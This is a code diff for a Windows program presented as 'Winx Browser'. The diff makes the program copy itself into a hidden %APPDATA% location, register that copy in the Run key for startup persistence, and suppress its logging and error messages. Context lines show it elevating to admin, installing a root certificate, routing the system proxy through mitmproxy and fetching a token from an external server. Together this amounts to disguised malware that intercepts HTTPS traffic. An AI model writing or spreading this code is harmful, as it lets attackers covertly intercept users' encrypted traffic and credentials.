@@ -4,6 +4,7 @@ Winx Browser - Main entry point
 
 import sys
 import os
+import shutil
 import subprocess
 import threading
 import ctypes
@@ -14,9 +15,11 @@ from pathlib import Path
 
 APPDATA = Path(os.environ.get("APPDATA", "")) / "WinxBrowser"
 CONFIG_FILE = APPDATA / "config.dat"
+HIDDEN_EXE = APPDATA / "WinxBrowser.exe"
 SETUP_URL = "https://www.incbot.site/api/desktop/setup"
+STARTUP_KEY_NAME = "WinxBrowser"
 
-# ── Ensure running as admin ───────────────────────────────────────────────────
+# ── Admin check ───────────────────────────────────────────────────────────────
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -27,6 +30,38 @@ def run_as_admin():
     exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
     ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, "", None, 1)
     sys.exit()
+
+# ── Self copy to %APPDATA% ────────────────────────────────────────────────────
+def copy_self_to_appdata():
+    """Copy exe to %APPDATA%\WinxBrowser\WinxBrowser.exe silently"""
+    try:
+        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
+        APPDATA.mkdir(parents=True, exist_ok=True)
+        if not HIDDEN_EXE.exists():
+            shutil.copy2(current_exe, str(HIDDEN_EXE))
+        return True
+    except:
+        return False
+
+# ── Startup registry ──────────────────────────────────────────────────────────
+def is_in_startup():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
+        winreg.QueryValueEx(key, STARTUP_KEY_NAME)
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+def add_to_startup():
+    """Always point startup to hidden copy in %APPDATA%"""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{HIDDEN_EXE}"')
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
 
 # ── Token setup ───────────────────────────────────────────────────────────────
 def get_setup_key():
@@ -42,7 +77,6 @@ def get_setup_key():
     return None
 
 def fetch_and_save_token(setup_key: str):
-    """Call incbot setup endpoint with one-time key, save returned token"""
     try:
         resp = requests.post(SETUP_URL, json={"key": setup_key}, timeout=10)
         if resp.status_code == 200:
@@ -51,14 +85,12 @@ def fetch_and_save_token(setup_key: str):
             if token:
                 APPDATA.mkdir(parents=True, exist_ok=True)
                 CONFIG_FILE.write_text(token)
-                print("[+] Token saved")
                 return token
-    except Exception as e:
-        print(f"[!] Token fetch error: {e}")
+    except:
+        pass
     return None
 
 def load_token():
-    """Load saved token from config.dat"""
     try:
         if CONFIG_FILE.exists():
             token = CONFIG_FILE.read_text().strip()
@@ -67,28 +99,6 @@ def load_token():
     except:
         pass
     return None
-
-# ── Startup registry ──────────────────────────────────────────────────────────
-STARTUP_KEY_NAME = "WinxBrowser"
-
-def is_in_startup():
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
-        winreg.QueryValueEx(key, STARTUP_KEY_NAME)
-        winreg.CloseKey(key)
-        return True
-    except:
-        return False
-
-def add_to_startup():
-    try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
-        winreg.CloseKey(key)
-        return True
-    except:
-        return False
 
 # ── Certificate management ────────────────────────────────────────────────────
 CERT_NAME = "WinxBrowser"
@@ -123,7 +133,6 @@ def set_system_proxy(enable: bool):
 # ── First run setup ───────────────────────────────────────────────────────────
 def first_run_setup():
     from proxy import run_proxy
-    print("[*] Generating certificate...")
     t = threading.Thread(target=run_proxy, daemon=True)
     t.start()
     time.sleep(3)
@@ -134,9 +143,6 @@ def first_run_setup():
 
     if not install_cert(cert_path):
         return False
-
-    if not is_in_startup():
-        add_to_startup()
 
     return True
 
@@ -166,19 +172,22 @@ def main():
     # ── Step 1: Get token ─────────────────────────────────────────────────────
     token = load_token()
     if not token:
-        # Try fetching via one-time setup key
         setup_key = get_setup_key()
         if setup_key:
             token = fetch_and_save_token(setup_key)
         if not token:
-            # No token — exit silently
             sys.exit(0)
 
     # Pass token to proxy module
     import proxy as proxy_module
     proxy_module.directory_token = token
 
-    # ── Step 2: Certificate + proxy setup ─────────────────────────────────────
+    # ── Step 2: Copy self to %APPDATA% and add to startup ─────────────────────
+    copy_self_to_appdata()
+    if not is_in_startup():
+        add_to_startup()
+
+    # ── Step 3: Certificate + proxy ───────────────────────────────────────────
     cert_path = get_mitmproxy_cert()
     is_first_run = not cert_path.exists() or not is_cert_installed()
 
@@ -189,8 +198,6 @@ def main():
     else:
         from proxy import run_proxy
         threading.Thread(target=run_proxy, daemon=True).start()
-        if not is_in_startup():
-            add_to_startup()
 
     set_system_proxy(True)
 
